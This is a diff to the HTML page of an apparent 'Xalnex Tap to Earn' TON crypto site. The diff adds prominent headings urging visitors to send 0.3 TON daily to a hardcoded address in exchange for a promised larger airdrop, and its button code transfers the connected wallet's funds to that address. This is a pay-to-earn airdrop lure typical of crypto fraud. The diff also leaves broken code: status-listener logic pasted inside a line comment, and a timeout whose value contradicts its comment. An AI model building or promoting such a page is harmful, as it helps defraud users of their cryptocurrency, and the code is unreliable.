@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>Xalnex Tap to Earn - TON Transaction</title>
+    
     <!-- Include TON Connect UI Library -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     
@@ -27,9 +28,12 @@ background-color: red;
 <body>
     <h1>Xalnex Tap to Earn</h1>
     <p>Connect your wallet to send TON tokens, And recieve Airdrops at the end.</p>
+    <p>Connected Wallet Address: <span id="wallet-address">Not connected</span></p>
     <!-- Connect Button -->
     <div id="ton-connect"></div>
-
+<h1>USE XALNEX TON ADDRESS TO SEND 0.3 TON TRANSCATION DAILY AND RECIEVE A LARGER VALUE IN THE AIRDROP </h1>
+   <h1>HERE IS THE XALNEX TON ADDRESS.</h1>
+    UQDKHIKHrWjBiJhngnffyul5rCWTQIkzwZ5nMt8I5VeZ8BcT
     <!-- Send Transaction Button -->
     <button id="send-transaction">Send 0.3 TON DALIY</button>
 
@@ -37,7 +41,7 @@ background-color: red;
         // Initialize TON Connect UI
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json', // Update with your manifest URL
-            buttonRootId: 'ton-connect'
+            buttonRootId: 'ton-connect' // Listen for connection status changes tonConnectUI.onStatusChange((wallet) => { if (wallet) { // User is connected const walletAddress = wallet.account.address; // Display the wallet address in your app document.getElementById('wallet-address').textContent = walletAddress; } else { // User is disconnected document.getElementById('wallet-address').textContent = 'Not connected'; } });
         });
 
         // Handle connection events
@@ -55,7 +59,7 @@ background-color: red;
         // Send TON Transaction
         document.getElementById('send-transaction').addEventListener('click', async () => {
             const transaction = {
-                validUntil: Date.now() + 5 * 60 * 1000, // 2 minutes from now
+                validUntil: Date.now() + 5 * 60 * 3000, // 2 minutes from now
                 messages: [
                     {
                         address: 'UQDKHIKHrWjBiJhngnffyul5rCWTQIkzwZ5nMt8I5VeZ8BcT', // Recipient address
